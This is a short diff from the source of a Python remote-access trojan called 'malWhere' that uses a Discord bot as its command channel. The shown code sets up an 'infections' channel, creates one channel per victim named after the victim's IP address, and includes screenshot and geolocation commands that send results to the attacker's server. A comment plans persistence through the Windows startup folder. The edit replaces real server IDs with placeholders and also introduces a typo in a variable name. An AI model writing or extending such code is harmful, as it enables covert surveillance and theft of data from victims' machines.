@@ -52,8 +52,8 @@ ip4chan=ip.replace(".","")
 async def on_ready():
   try:
     print(f"logged in as {malWhere}")
-    guild = malWhere.get_guild(874824520467349504)
-    infectionschannel=malWhere.get_channel(874824520693874756)
+    guild = malWhere.get_guild(<guild-id>)
+    infeinfectionschannel=malWhere.get_channel(<infection-channel-id>)
     #insert peristance module for windows
     #clone necesssary files into startup 
     existing_channel = discord.utils.get(guild.channels, name=ip4chan)
@@ -115,7 +115,7 @@ async def geolocate(ctx):
 @malWhere.command()
 async def screenshot(ctx):
   try:
-    guild = malWhere.get_guild(874824520467349504)
+    guild = malWhere.get_guild(<guild id again>)
     existing_channel = discord.utils.get(guild.channels, name=(f"{ip4chan}-media"))
     channel_id = existing_channel.id
     if not existing_channel:
